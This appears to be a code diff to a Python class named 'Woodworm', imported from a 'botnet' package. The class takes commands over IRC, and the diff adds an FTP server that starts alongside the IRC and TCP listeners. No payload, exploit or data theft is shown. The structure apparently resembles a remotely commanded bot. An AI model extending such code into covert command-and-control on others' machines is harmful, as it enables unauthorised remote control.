@@ -8,6 +8,7 @@ from botnet.tcp import tcp_services
 import socket
 import os
 import datetime
+from ftp import ftp_services
 
 
 class Woodworm:
@@ -38,6 +39,8 @@ class Woodworm:
         self.irc_connection.onCommandSEND.subscribe(self.irc_onCommandSEND)
         self.irc_connection.onCommandHELP.subscribe(self.irc_onCommandHELP)
         self.irc_connection.onCommandSTATUS.subscribe(self.irc_onCommandSTATUS)
+        
+        self.ftp = ftp_services.FTPServer()
 
 
     async def start(self, debug):
@@ -49,6 +52,7 @@ class Woodworm:
             async with asyncio.TaskGroup() as tg:
                 tg.create_task(self.irc_connection.listen(0.0))
                 tg.create_task(self.tcp_server.listen(0.0))
+                tg.create_task(self.ftp.start())
         else:
             while True:
                 await self.irc_connection.listen_step(0.0)
